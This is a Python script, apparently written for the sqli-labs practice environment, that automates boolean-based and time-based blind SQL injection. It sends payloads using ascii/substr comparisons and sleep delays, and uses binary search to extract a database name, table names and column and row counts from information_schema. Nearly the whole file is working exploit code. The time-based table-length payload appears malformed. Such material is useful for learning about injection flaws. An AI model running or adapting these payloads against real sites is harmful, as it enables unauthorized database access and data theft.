
# -*-coding:utf-8-*-
 
""" 
@version:  
@author: giantbranch 
@file: blindsqlinjection.py 
@time: 2016/5/1  
""" 
import requests
import urllib

class SqlInject(object):

    def __init__(self, lessNum):
        self.lessNum = lessNum
        self.successStr = "You are in"
        self.getTable = "users"
        
        self.index = "0"
        self.database = "database()"
        self.selectDB = "select database()" 
        self.selectTable = "select table_name from information_schema.tables where table_schema=\'%s\' limit %d,1"

        if self.lessNum == 8:
            #基于错误的盲注
            self.url = "http://localhost:8002/Less-8/?id=1"
            self.asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"
            self.lengthPayload = "' and length(%s)>=%d #"
            self.selectTableCountPayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"
            self.selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
            self.selectTableNameLengthPayloadbehind = ",1)>=%d #"
            self.selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='security'" + " and table_name='%s')>=%d #"
            self.dataCountPayload = "'and (select count(*) from %s)>=%d #"
        elif self.lessNum == 9:
            #基于时间的盲注
            self.url = "http://localhost:8002/Less-9/?id=1"
            self.asciiPayload = "' and if(ascii(substr(%s,%d,1))>=%d,0,sleep(2)) #"
            self.lengthPayload = "' and if(length(%s)>=%d,0,sleep(2)) #"
            self.selectTableCountPayload = "' and if((select count(table_name) from information_schema.tables where table_schema='%s')>=%d,0,sleep(2)) #"
            self.selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
            self.selectTableNameLengthPayloadbehind = ",1)>=%d,0,sleep(2)) #"

    # 发送请求，根据页面的响应猜测结果
    def get_result(self,payload,string,length=0,pos=0,ascii=0):
        if pos == 0:
            finalUrl = self.url + urllib.parse.quote(payload % (string, length))
        else:
            finalUrl = self.url + urllib.parse.quote(payload % (string, pos, ascii))
        res = requests.get(finalUrl)
        if self.lessNum == 8:
            if self.successStr in res.content.decode("utf-8"):
                return True
            else:
                return False

        elif self.lessNum == 9:
            if res.elapsed.total_seconds() < 2:
                return True
            else:
                return False

    # 获取字符串的长度          
    def get_length_of_string(self,payload, string):
        # 猜长度
        lengthLeft = 0
        lengthRigth = 0
        guess = 10
        # 确定长度上限，每次增加5
        while 1:
            # 如果长度大于guess
            if self.get_result(payload, string, guess) == True:
                # 猜测值增加5
                guess = guess + 5   
            else:
                lengthRigth = guess
                break
        # print "lengthRigth: " + str(lengthRigth)
        # 二分法查长度
        mid = int((lengthLeft + lengthRigth) / 2)
        while lengthLeft < lengthRigth - 1:
            # 如果长度大于等于mid 
            if self.get_result(payload, string, mid) == True:
                # 更新长度的左边界为mid
                lengthLeft = mid 
            else: 
            # 否则就是长度小于mid
                # 更新长度的右边界为mid
                lengthRigth = mid
            # 更新中值
            mid = int((lengthLeft + lengthRigth) / 2)        
            # print lengthLeft, lengthRigth
        # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid
        # 所以长度区间：大于等于 lengthLeft，小于lengthRigth
        # 而循环条件是 lengthLeft < lengthRigth - 1，退出循环，lengthLeft就是所求长度
        # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8<=length<9,length就肯定等于8
        return lengthLeft
    def get_name(self,payload,string,lengthOfString):
        tmp=""
        for i in range(1,lengthOfString+1):
            left=32
            right=127
            mid = int((left+right)/2)
            while left < right-1:
                if self.get_result(payload, string, pos=i, ascii=mid) == True:
                    left = mid
                else:
                    right = mid
                mid = int((left + right) / 2)
            tmp += chr(left)
        return tmp

    def get_table_name(self,selectTableCountPayload, selectTableNameLengthPayloadfront, selectTableNameLengthPayloadbehind, DBname):
        '''
        获取所有表名称
        :param DBname:
        :return:
        '''
        tableCount = self.get_length_of_string(selectTableCountPayload, DBname)
        tableName =[]
        for i in range(0, tableCount):
            # 第几个表
            num = str(i)
            # 获取当前这个表的长度
            selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
            tableNameLength = self.get_length_of_string(selectTableNameLengthPayload, DBname)
            # print "current table length:" + str(tableNameLength)
            # 获取当前这个表的名字
            selectTableName = self.selectTable % (DBname, i)
            tableName.append(self.get_name(self.asciiPayload, selectTableName, tableNameLength))
        return(tableCount,tableName)

    def get_column_name(self, selectColumnCountPayload, dataCountPayload, tableName):

        columnCount = self.get_length_of_string(selectColumnCountPayload, tableName)
        dataCount = self.get_length_of_string(dataCountPayload,tableName)

        return (columnCount, dataCount)




if __name__ == '__main__':

    lessNum = 8
    a = SqlInject(lessNum)
    print("Less: " + str(lessNum))

    DBlength = a.get_length_of_string(a.lengthPayload, a.database)
    print("数据库名长度：" + str(DBlength))

    DBname = a.get_name(a.asciiPayload, a.database, DBlength)
    print("数据库名称：" + DBname)

    #获取数据库表名称
    tableName= a.get_table_name(a.selectTableCountPayload, a.selectTableNameLengthPayloadfront, a.selectTableNameLengthPayloadbehind, DBname)

    print("表数量: " + str(tableName[0]))
    print("表名： " + str(tableName[1]))

    #获取users表数据
    dataCount = a.get_column_name(a.selectColumnCountPayload, a.dataCountPayload, a.getTable)
    print (dataCount)

